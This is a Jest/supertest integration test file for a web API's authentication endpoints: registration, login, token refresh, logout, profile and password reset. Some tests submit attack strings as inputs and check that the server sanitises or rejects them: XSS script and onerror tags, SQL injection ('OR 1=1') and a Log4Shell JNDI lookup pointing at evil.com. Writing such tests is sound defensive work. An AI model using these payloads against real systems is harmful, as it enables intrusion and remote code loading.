import request from 'supertest';
import { describe, test, expect, beforeEach } from '@jest/globals';
import { TestUtils } from '../setup';
import { User } from '../../src/core/database/models/User';

import { tokenManager } from '../../src/core/auth/TokenManager';

/**
 * Comprehensive authentication integration tests
 * Tests all authentication endpoints, security features, and edge cases
 */

describe('Authentication Integration Tests', () => {
  let app: any;
  
  beforeEach(() => {
    app = TestUtils.getApp();
  });

  describe('POST /api/v1/auth/register', () => {
    test('should register a new user successfully', async () => {
      const userData = TestUtils.generateRandomUser();
      
      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(201);

      TestUtils.assertSuccessResponse(response, 201);
      expect(response.body.data).toHaveProperty('user');
      expect(response.body.data).toHaveProperty('token');
      expect(response.body.data.user.email).toBe(userData.email);
      expect(response.body.data.user).not.toHaveProperty('password');
    });

    test('should not register user with existing email', async () => {
      const userData = TestUtils.generateRandomUser();
      
      // Create user first
      await User.create(userData);
      
      // Try to register again
      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(400);

      TestUtils.assertErrorResponse(response, 400, 'already exists');
    });

    test('should validate required fields', async () => {
      const response = await request(app)
        .post('/api/v1/auth/register')
        .send({})
        .expect(400);

      TestUtils.assertErrorResponse(response, 400);
      expect(response.body.error).toHaveProperty('details');
    });

    test('should validate email format', async () => {
      const userData = {
        ...TestUtils.generateRandomUser(),
        email: 'invalid-email'
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(400);

      TestUtils.assertErrorResponse(response, 400);
    });

    test('should validate password strength', async () => {
      const userData = {
        ...TestUtils.generateRandomUser(),
        password: 'weak'
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(400);

      TestUtils.assertErrorResponse(response, 400);
    });

    test('should handle XSS in registration data', async () => {
      const userData = {
        ...TestUtils.generateRandomUser(),
        firstName: '<script>alert("xss")</script>Test',
        lastName: '<img src="x" onerror="alert(1)">User'
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(userData)
        .expect(201);

      TestUtils.assertSuccessResponse(response, 201);
      expect(response.body.data.user.firstName).not.toContain('<script>');
      expect(response.body.data.user.lastName).not.toContain('<img');
    });
  });

  describe('POST /api/v1/auth/login', () => {
    let testUser: any;
    const userPassword = 'TestPassword123!';

    beforeEach(async () => {
      testUser = await User.create({
        ...TestUtils.generateRandomUser(),
        password: userPassword
      });
    });

    test('should login with valid credentials', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: userPassword
        })
        .expect(200);

      TestUtils.assertSuccessResponse(response);
      expect(response.body.data).toHaveProperty('user');
      expect(response.body.data).toHaveProperty('token');
      expect(response.body.data).toHaveProperty('refreshToken');
      expect(response.body.data.user).not.toHaveProperty('password');
    });

    test('should not login with invalid email', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: 'nonexistent@example.com',
          password: userPassword
        })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'Invalid credentials');
    });

    test('should not login with invalid password', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: 'wrongpassword'
        })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'Invalid credentials');
    });

    test('should not login with inactive user', async () => {
      // Deactivate user
      await testUser.update({ isActive: false });

      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: testUser.email,
          password: userPassword
        })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'Account is not active');
    });

    test('should rate limit login attempts', async () => {
      // Make multiple failed login attempts
      const promises = Array(15).fill(null).map(() => 
        request(app)
          .post('/api/v1/auth/login')
          .send({
            email: testUser.email,
            password: 'wrongpassword'
          })
      );

      const responses = await Promise.all(promises);
      
      // Should have at least one rate limited response
      const rateLimited = responses.some(res => res.status === 429);
      expect(rateLimited).toBe(true);
    });

    test('should handle SQL injection attempts in login', async () => {
      const response = await request(app)
        .post('/api/v1/auth/login')
        .send({
          email: "admin' OR '1'='1",
          password: "' OR '1'='1"
        })
        .expect(400);

      TestUtils.assertErrorResponse(response, 400);
    });
  });

  describe('POST /api/v1/auth/refresh', () => {
    let testUser: any;
    let refreshToken: string;

    beforeEach(async () => {
      const userData = TestUtils.generateRandomUser();
      testUser = await User.create(userData);
      refreshToken = await tokenManager.generateRefreshToken(testUser);
    });

    test('should refresh token with valid refresh token', async () => {
      const response = await request(app)
        .post('/api/v1/auth/refresh')
        .send({ refreshToken })
        .expect(200);

      TestUtils.assertSuccessResponse(response);
      expect(response.body.data).toHaveProperty('token');
      expect(response.body.data).toHaveProperty('refreshToken');
    });

    test('should not refresh with invalid token', async () => {
      const response = await request(app)
        .post('/api/v1/auth/refresh')
        .send({ refreshToken: 'invalid-token' })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'Invalid refresh token');
    });
  });

  describe('POST /api/v1/auth/logout', () => {
    let authUser: { user: any; token: string };

    beforeEach(async () => {
      authUser = await TestUtils.createAuthenticatedUser();
    });

    test('should logout successfully', async () => {
      const response = await request(app)
        .post('/api/v1/auth/logout')
        .set(TestUtils.getAuthHeaders(authUser.token))
        .expect(200);

      TestUtils.assertSuccessResponse(response);
      expect(response.body.data.message).toContain('logged out');
    });

    test('should not access protected routes after logout', async () => {
      // Logout first
      await request(app)
        .post('/api/v1/auth/logout')
        .set(TestUtils.getAuthHeaders(authUser.token))
        .expect(200);

      // Try to access protected route
      const response = await request(app)
        .get('/api/v1/auth/profile')
        .set(TestUtils.getAuthHeaders(authUser.token))
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'invalid');
    });
  });

  describe('GET /api/v1/auth/profile', () => {
    let authUser: { user: any; token: string };

    beforeEach(async () => {
      authUser = await TestUtils.createAuthenticatedUser();
    });

    test('should get user profile with valid token', async () => {
      const response = await request(app)
        .get('/api/v1/auth/profile')
        .set(TestUtils.getAuthHeaders(authUser.token))
        .expect(200);

      TestUtils.assertSuccessResponse(response);
      expect(response.body.data.user).toHaveProperty('id');
      expect(response.body.data.user).toHaveProperty('email');
      expect(response.body.data.user).not.toHaveProperty('password');
    });

    test('should not get profile without token', async () => {
      const response = await request(app)
        .get('/api/v1/auth/profile')
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'No token provided');
    });

    test('should not get profile with invalid token', async () => {
      const response = await request(app)
        .get('/api/v1/auth/profile')
        .set({ Authorization: 'Bearer invalid-token' })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401, 'invalid');
    });
  });

  describe('Password Reset Flow', () => {
    let testUser: any;
    const userPassword = 'TestPassword123!';

    beforeEach(async () => {
      testUser = await User.create({
        ...TestUtils.generateRandomUser(),
        password: userPassword
      });
    });

    describe('POST /api/v1/auth/forgot-password', () => {
      test('should initiate password reset', async () => {
        const response = await request(app)
          .post('/api/v1/auth/forgot-password')
          .send({ email: testUser.email })
          .expect(200);

        TestUtils.assertSuccessResponse(response);
        expect(response.body.data.message).toContain('sent');
      });

      test('should handle non-existent email gracefully', async () => {
        const response = await request(app)
          .post('/api/v1/auth/forgot-password')
          .send({ email: 'nonexistent@example.com' })
          .expect(200);

        // Should not reveal that email doesn't exist
        TestUtils.assertSuccessResponse(response);
      });
    });

    describe('POST /api/v1/auth/reset-password', () => {
      let resetToken: string;

      beforeEach(async () => {
        // Generate reset token
        const crypto = require('crypto');
        resetToken = crypto.randomBytes(32).toString('hex');
        
        await testUser.update({
          passwordResetToken: resetToken,
          passwordResetExpiresAt: new Date(Date.now() + 3600000) // 1 hour
        });
      });

      test('should reset password with valid token', async () => {
        const newPassword = 'NewPassword123!';
        
        const response = await request(app)
          .post('/api/v1/auth/reset-password')
          .send({
            token: resetToken,
            password: newPassword
          })
          .expect(200);

        TestUtils.assertSuccessResponse(response);

        // Verify old password doesn't work
        const loginResponse = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: testUser.email,
            password: userPassword
          })
          .expect(401);

        // Verify new password works
        const newLoginResponse = await request(app)
          .post('/api/v1/auth/login')
          .send({
            email: testUser.email,
            password: newPassword
          })
          .expect(200);

        TestUtils.assertSuccessResponse(newLoginResponse);
      });

      test('should not reset password with invalid token', async () => {
        const response = await request(app)
          .post('/api/v1/auth/reset-password')
          .send({
            token: 'invalid-token',
            password: 'NewPassword123!'
          })
          .expect(400);

        TestUtils.assertErrorResponse(response, 400, 'Invalid or expired');
      });

      test('should not reset password with expired token', async () => {
        // Expire the token
        await testUser.update({
          passwordResetExpiresAt: new Date(Date.now() - 3600000) // 1 hour ago
        });

        const response = await request(app)
          .post('/api/v1/auth/reset-password')
          .send({
            token: resetToken,
            password: 'NewPassword123!'
          })
          .expect(400);

        TestUtils.assertErrorResponse(response, 400, 'expired');
      });
    });
  });

  describe('Security Tests', () => {
    test('should handle concurrent login attempts', async () => {
      const userData = TestUtils.generateRandomUser();
      const user = await User.create(userData);

      // Test concurrent logins
      const requests = Array(10).fill(null).map(() =>
        request(app)
          .post('/api/v1/auth/login')
          .send({
            email: user.email,
            password: userData.password
          })
      );

      const responses = await Promise.all(requests);
      
      // All should succeed (no race conditions)
      responses.forEach(response => {
        expect([200, 429]).toContain(response.status);
      });
    });

    test('should prevent brute force attacks', async () => {
      const userData = TestUtils.generateRandomUser();
      const user = await User.create(userData);

      // Make many failed attempts
      const failedAttempts = Array(20).fill(null).map(() =>
        request(app)
          .post('/api/v1/auth/login')
          .send({
            email: user.email,
            password: 'wrongpassword'
          })
      );

      const responses = await Promise.all(failedAttempts);
      
      // Should have rate limited responses
      const rateLimited = responses.filter(res => res.status === 429);
      expect(rateLimited.length).toBeGreaterThan(0);
    });

    test('should sanitize user input', async () => {
      const maliciousData = {
        email: 'test@example.com',
        password: 'TestPassword123!',
        firstName: '<script>alert("xss")</script>',
        lastName: '${jndi:ldap://evil.com/a}'
      };

      const response = await request(app)
        .post('/api/v1/auth/register')
        .send(maliciousData)
        .expect(201);

      TestUtils.assertSuccessResponse(response, 201);
      
      // Should not contain malicious content
      expect(response.body.data.user.firstName).not.toContain('<script>');
      expect(response.body.data.user.lastName).not.toContain('${jndi:');
    });

    test('should validate JWT token integrity', async () => {
      const authUser = await TestUtils.createAuthenticatedUser();
      
      // Tamper with the token
      const tamperedToken = authUser.token.slice(0, -5) + 'XXXXX';

      const response = await request(app)
        .get('/api/v1/auth/profile')
        .set({ Authorization: `Bearer ${tamperedToken}` })
        .expect(401);

      TestUtils.assertErrorResponse(response, 401);
    });
  });

  describe('Performance Tests', () => {
    test('registration should complete within acceptable time', async () => {
      const userData = TestUtils.generateRandomUser();
      
      const { executionTime } = await TestUtils.measureExecutionTime(async () => {
        return request(app)
          .post('/api/v1/auth/register')
          .send(userData);
      });

      // Should complete within 2 seconds
      expect(executionTime).toBeLessThan(2000);
    });

    test('should handle concurrent registrations', async () => {
      const requests = Array(20).fill(null).map(() => {
        return request(app)
          .post('/api/v1/auth/register')
          .send(TestUtils.generateRandomUser());
      });

      const responses = await Promise.all(requests);
      
      // All should succeed or fail with proper error codes
      responses.forEach(response => {
        expect([201, 400, 429]).toContain(response.status);
      });
    });
  });
});